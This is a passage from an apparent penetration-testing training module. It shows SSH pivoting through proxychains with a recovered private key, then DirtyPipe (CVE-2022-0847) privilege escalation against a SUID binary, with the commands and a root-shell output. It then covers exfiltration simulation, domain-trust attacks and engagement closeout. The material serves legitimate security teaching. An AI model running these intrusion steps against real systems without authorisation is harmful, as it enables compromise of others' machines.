Nmap done: <span class="hljs-number">1</span> <span class="hljs-built_in">IP</span> address (<span class="hljs-number">1</span> host <span class="hljs-meta">up</span>) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">1.50</span> seconds
</code></pre>
<p>Finally, we can try each SSH key with proxychains to attempt to connect to the host. We can collect each username by the SSH key filename. In our case the key for <code>ssmallsadm</code> works (don&#39;t forget to <code>chmod 600</code> the file or we won&#39;t be able to connect).</p>
<p>Post-Exploitation</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ proxychains ssh -i ssmallsadm-id_rsa ssmallsadm@<span class="hljs-number">172.16</span><span class="hljs-number">.9</span><span class="hljs-number">.25</span>

ProxyChains<span class="hljs-number">-3.1</span> (<span class="hljs-string">http:</span><span class="hljs-comment">//proxychains.sf.net)</span>
|S-chain|-&lt;&gt;<span class="hljs-number">-127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">9050</span>-&lt;&gt;&lt;&gt;<span class="hljs-number">-172.16</span><span class="hljs-number">.9</span><span class="hljs-number">.25</span>:<span class="hljs-number">22</span>-&lt;&gt;&lt;&gt;-OK
Welcome to Ubuntu <span class="hljs-number">20.04</span><span class="hljs-number">.3</span> LTS (GNU/Linux <span class="hljs-number">5.10</span><span class="hljs-number">.0</span><span class="hljs-number">-051000</span>-generic x86_64)

 * <span class="hljs-string">Documentation:</span>  <span class="hljs-string">https:</span><span class="hljs-comment">//help.ubuntu.com</span>
 * <span class="hljs-string">Management:</span>     <span class="hljs-string">https:</span><span class="hljs-comment">//landscape.canonical.com</span>
 * <span class="hljs-string">Support:</span>        <span class="hljs-string">https:</span><span class="hljs-comment">//ubuntu.com/advantage</span>

  System information <span class="hljs-keyword">as</span> of Thu <span class="hljs-number">23</span> Jun <span class="hljs-number">2022</span> <span class="hljs-number">01</span>:<span class="hljs-number">48</span>:<span class="hljs-number">14</span> AM UTC

  System <span class="hljs-string">load:</span>  <span class="hljs-number">0.0</span>                <span class="hljs-string">Processes:</span>               <span class="hljs-number">231</span>
  Usage of /:   <span class="hljs-number">27.9</span>% of <span class="hljs-number">13.72</span>GB   Users logged <span class="hljs-string">in:</span>         <span class="hljs-number">0</span>
  Memory <span class="hljs-string">usage:</span> <span class="hljs-number">14</span>%                IPv4 address <span class="hljs-keyword">for</span> <span class="hljs-string">ens192:</span> <span class="hljs-number">172.16</span><span class="hljs-number">.9</span><span class="hljs-number">.25</span>
  Swap <span class="hljs-string">usage:</span>   <span class="hljs-number">0</span>%


<span class="hljs-number">159</span> updates can be applied immediately.
<span class="hljs-number">103</span> of these updates are standard security updates.
To see these additional updates <span class="hljs-string">run:</span> apt list --upgradable


The list of available updates is more than a week old.
To check <span class="hljs-keyword">for</span> <span class="hljs-keyword">new</span> updates <span class="hljs-string">run:</span> sudo apt update

Last <span class="hljs-string">login:</span> Mon May <span class="hljs-number">23</span> <span class="hljs-number">08</span>:<span class="hljs-number">48</span>:<span class="hljs-number">13</span> <span class="hljs-number">2022</span> from <span class="hljs-number">172.16</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>
</code></pre>
<p>As a final step we&#39;ll enumerate the target system, checking for local privilege escalation opportunities. If we can get root-level access we&#39;ll have fulfilled the client&#39;s main goal, as they stated that this server holds their &quot;crown jewels&quot;, or most important data. During our enumeration we do a Google search based off of the Kernel version and see that it&#39;s likely vulnerable to the <a href="https://www.cisa.gov/uscert/ncas/current-activity/2022/03/10/dirty-pipe-privilege-escalation-vulnerability-linux">DirtyPipe</a>, <code>CVE-2022-0847</code>. We can read an excellent explanation of this vulnerability on the <a href="https://www.hackthebox.com/blog/Dirty-Pipe-Explained-CVE-2022-0847">Hack The Box blog</a>.</p>
<p>Post-Exploitation</p>
<pre><code class="lang-shell-session">ssmallsadm<span class="hljs-variable">@MGMT01</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>uname -a

Linux MGMT01 <span class="hljs-number">5.10</span>.<span class="hljs-number">0</span>-<span class="hljs-number">051000</span>-generic <span class="hljs-comment">#202012132330 SMP Sun Dec 13 23:33:36 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span>
</code></pre>
<p>We&#39;ll use exploit-2 from <a href="https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits">this GitHub repo</a>. Since we have SSH access to the system, we can create a file with <code>Vim</code> and paste the exploit code in. We then must compile it, and luckily <code>gcc</code> is present on the system.</p>
<p>Post-Exploitation</p>
<pre><code class="lang-shell-session">ssmallsadm<span class="hljs-variable">@MGMT01</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>gcc dirtypipe.c -o dirtypipe
ssmallsadm<span class="hljs-variable">@MGMT01</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>chmod +x dirtypipe
ssmallsadm<span class="hljs-variable">@MGMT01</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>./dirtypipe 

<span class="hljs-symbol">Usage:</span> ./dirtypipe SUID
</code></pre>
<p>We must run the exploit against a SUID binary to inject and overwrite memory in a root process. So first we need to search SUID binaries on the system.</p>
<p>Post-Exploitation</p>
<pre><code class="lang-shell-session">ssmallsadm@<span class="hljs-symbol">MGMT01:</span>~$ find / -perm -<span class="hljs-number">4000</span> <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/null</span>

/usr/<span class="hljs-class"><span class="hljs-keyword">lib</span>/<span class="hljs-title">openssh</span>/<span class="hljs-title">ssh</span>-<span class="hljs-title">keysign</span></span>
/usr/<span class="hljs-class"><span class="hljs-keyword">lib</span>/<span class="hljs-title">snapd</span>/<span class="hljs-title">snap</span>-<span class="hljs-title">confine</span></span>
/usr/<span class="hljs-class"><span class="hljs-keyword">lib</span>/<span class="hljs-title">policykit</span>-1/<span class="hljs-title">polkit</span>-<span class="hljs-title">agent</span>-<span class="hljs-title">helper</span>-1</span>
/usr/<span class="hljs-class"><span class="hljs-keyword">lib</span>/<span class="hljs-title">eject</span>/<span class="hljs-title">dmcrypt</span>-<span class="hljs-title">get</span>-<span class="hljs-title">device</span></span>
/usr/<span class="hljs-class"><span class="hljs-keyword">lib</span>/<span class="hljs-title">dbus</span>-1.0/<span class="hljs-title">dbus</span>-<span class="hljs-title">daemon</span>-<span class="hljs-title">launch</span>-<span class="hljs-title">helper</span></span>
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/fusermount

&lt;SNIP&gt;
</code></pre>
<p>Finally, we&#39;ll run the exploit against the <code>/usr/lib/openssh/ssh-keysign</code> SUID binary and drop into a root shell.</p>
<p>Post-Exploitation</p>
<pre><code class="lang-shell-session">ssmallsadm@<span class="hljs-symbol">MGMT01:</span>~$ ./dirtypipe /usr/<span class="hljs-class"><span class="hljs-keyword">lib</span>/<span class="hljs-title">openssh</span>/<span class="hljs-title">ssh</span>-<span class="hljs-title">keysign</span></span>

[+] hijacking suid binary..
[+] dropping suid shell..
[+] restoring suid binary..
[+] popping root shell.. (dont forget to clean up /tmp/sh ;))
<span class="hljs-comment"># id</span>
uid=<span class="hljs-number">0</span>(root) gid=<span class="hljs-number">0</span>(root) groups=<span class="hljs-number">0</span>(root),<span class="hljs-number">1001</span>(ssmallsadm)
</code></pre>
<p>From here we could perform post-exploitation of the file system to prove the level of access we achieved.</p>
<hr>
<h3 id="data-exfiltration-simulation">Data Exfiltration Simulation</h3>
<p>Some clients may want to test their <code>Data Loss Prevention</code> (<code>DLP</code>) capabilities, so we could experiment with various ways to exfiltrate mock data from their network to see if we are detected. We should work with the client to understand what types of data they are trying to protect and proceed accordingly. It&#39;s best to use mock data so we don&#39;t have to deal with any highly sensitive client data on our testing system.</p>
<hr>
<h3 id="attacking-domain-trusts">Attacking Domain Trusts</h3>
<p>If there are any domain trusts we could use our skills to enumerate these relationships and exploit either a child --&gt; parent trust relationship, intra-forest trust, or an external forest trust. Before doing so, we should check with the client to make sure the target domain is in scope for testing. Sometimes we&#39;ll compromise a less import domain and be able to use this access to fully take over the principal domain. This can provide a lot of value to the client as they may have set up trust relationships hastily as the result of a merger &amp; acquisition or connecting to some other organization. Their domain may be well-hardened, but what if we are able to Kerberoast across a forest trust, compromise a partner forest, and then find an account in the partner forest that has full admin rights in our current domain. In this situation we could demonstrate to our client that the main weakness isn&#39;t in the domain we are testing in but another so they can proceed accordingly.</p>
<hr>
<h3 id="closing-thoughts">Closing Thoughts</h3>
<p>This section showed a sampling of the things we can do <code>AFTER</code> achieving Domain Admin in a client environment. Showing up, pwning the client and showing off how fast you got DA does no good for the client and does not help you and your firm retain clients and spread a solid reputation around. What we do after achieving Domain Admin is extremely important and this is where we can set ourselves apart from other testers who just run Responder, a few other tools and scripts, a Nessus scan, and issue a stock report and call it a day. Your report deliverable should demonstrate the worth of the penetration test your client is paying for and we can make sure they are happy and come back in the following years if we go above and beyond. This is not always possible due to contract restrictions and time-boxed assessments, but even if we can provide a little extra we&#39;re ahead of the pack. Keep in mind that the things we identify in our report can impact a client&#39;s funding for the following year and that funding likely includes penetration tests. We don&#39;t want to inflate the report with nonsensical findings, of course, but we can often identify many things that our client had never even considered and they and you will be better for it.</p>
<h2 id="engagement-closeout">Engagement Closeout</h2>
<hr>
<p>We&#39;ve reached the end of the engagement, and there are some tasks we must perform before wrapping everything up. The first thing we should do is send our client an email notifying them that the testing period has ended and a specific time frame they can expect us to deliver the report. At this time, you can also ask them to give potential times for a report review meeting, but this is usually better to do later when delivering the report. Some firms will also provide a summary of findings after the assessment, but this differs from company to company. If you have communicated clearly with your client throughout the assessment, they should already have a good idea of what to expect. Bottom line, we don&#39;t want them to hear about the highest risk findings for the first time when they receive the report and be completely blindsided.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/163/end\_testing.png" alt="text"></p>
<hr>
<h3 id="attack-path-recap">Attack Path Recap</h3>
<p>Writing out your attack path from start to finish is a good idea to help you visualize the path taken and what findings to pull out of it. This also helps to add to the report to summarize the attack chain walkthrough. This recap is a good way to ensure you didn&#39;t miss anything critical in the chain from initial access up to domain compromise. This recap should only show the path of least resistance and not include the extra steps taken or the entire thought process of testing, as this can clutter things up and make it difficult to follow.</p>
<p>Some penetration testing forms will structure their report in narrative form, given a step-by-step walkthrough of every action performed from start to finish and calling out the specific findings along the way. The approach here will differ from company to company. Regardless, it&#39;s a good idea to have this list handy to help with reporting, and if the client reaches out to ask how you achieved X.</p>
<hr>
<h3 id="structuring-our-findings">Structuring our Findings</h3>
<p>Ideally, we have noted down findings as we test, including as many command outputs and evidence in our notetaking tool as possible. This should be done in a structured way, so it&#39;s easy to drop into the report. If we haven&#39;t been doing this, we should ensure we have a prioritized finding list and all necessary command output and screenshots before we lose access to the internal network or cease any external testing. We don&#39;t want to be in the position of asking the client to grant us access again to gather some evidence or run additional scans. We should have been structuring our findings list from <code>highest to lowest risk</code> as we test because this list can be beneficial to send to the client at the end of testing and is very helpful when drafting our report.</p>
<p>For more on notetaking and reporting, see the <a href="https://academy.hackthebox.com/module/162/section/1533">Documentation &amp; Reporting module</a>. It&#39;s worth following the tips in that module for setting up your testing and notetaking environment and approaching the network in this module (Attacking Enterprise Networks) as a real-world penetration test, documenting and logging everything we do along the way. It&#39;s also great practice to use the sample report from the <code>Documentation &amp; Reporting</code> module and create a report based on this network. This network has many opportunities to practice all aspects of report documentation and report writing.</p>
<hr>
<h3 id="post-engagement-cleanup">Post-Engagement Cleanup</h3>
<p>If this were a real engagement, we should be noting down:</p>
<ul>
<li><code>Every scan</code></li>
<li><code>Attack attempt</code></li>
<li><code>File placed on a system</code></li>
<li><code>Changes made</code> (accounts created, minor configuration changes, etc.)</li>
</ul>
<p>Before the engagement closes, we should delete any files we uploaded (tools, shells, payloads, notes) and restore everything to the way we found it. Regardless of if we were able to clean everything up, we should still note down in our report appendices every change, file uploaded, account compromise, and host compromise, along with the methods used. We should also retain our logs and a detailed activity log for a period after the assessment ends in case the client needs to correlate any of our testing activities with some alerts. Treat the network in this module like a real-world customer network. <code>Go back through a second time</code> and <code>pentest it as if it were an actual production network</code>, taking minimally invasive actions, noting down all actions that may require cleanup, and <code>clean up after yourself at the end!</code> This is a great habit to develop.</p>
<hr>
<h3 id="client-communication">Client Communication</h3>
<p>We absolutely need to let the client know when testing has ended so they know when any abnormal activities they may be seeing are no longer related to our testing. We should also stay in clear communication during the reporting phase, providing the client with a precise delivery date for the report and a brief recap of our findings if asked. At this time, our manager or the Project Manager may be reaching out to the client to schedule a report review meeting, which we should expect to attend to walk through the results of our testing. If retesting is part of the Scope of Work, we should work with the client on a timeline for their remediation activities to be complete. However, they may not have an idea yet, so they may reach out regarding post-remediation testing at a later date. The client may reach out periodically over the next few days or weeks to correlate alerts they received, so we should have our notes and logs handy in case we need to justify or clarify any of our actions.</p>
<hr>
<h3 id="internal-project-closeout">Internal Project Closeout</h3>
<p>Once the report has been delivered, and the closeout meeting is completed, your company will take various activities to close out the project, such as:</p>
<ul>
<li>Archiving the report and associated project data on a company share drive</li>
<li>Hold a lessons learned debriefing</li>
<li>Potentially fill out a post-engagement questionnaire for the sales team</li>
<li>Perform administrative tasks such as invoicing</li>
</ul>
<p>While it is best to have the original tester perform post-remediation testing, schedules may not align. We may need to do an internal knowledge transfer to another teammate. Now we should sit back, think about what went well and could be improved on during the assessment, and prepare for the next one.</p>
<hr>
<h3 id="next-steps">Next Steps</h3>
<p>Now that you&#39;ve completed this module, it&#39;s worth going back through the lab without the guide or minimal guidance to test your skills. Make a list of all the skills and associated modules covered in this lab and revisit topics you still have trouble with. Use this lab to hone your craft, try out different tools and techniques to complete the lab, practice documentation and reporting, and even prepare a briefing for a colleague or friend to practice your oral presentation skills. The following section provides more insight into additional steps we can take after finishing this module (and path). You may also want to consider working on one or more Pro Labs, which we recommend also approaching as a pentest to practice your engagement skills as much as possible.</p>
